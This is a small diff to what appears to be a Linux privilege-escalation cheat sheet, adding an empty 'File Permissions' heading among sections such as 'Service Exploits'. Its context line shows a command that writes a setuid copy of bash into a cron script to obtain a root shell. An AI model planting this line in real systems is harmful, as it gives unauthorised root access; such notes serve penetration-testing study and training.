@@ -323,6 +323,8 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
 
 ## Timers
 
+## File Permissions
+
 ## Service Exploits
 
 ## Passwords, Hashes, and Credentials
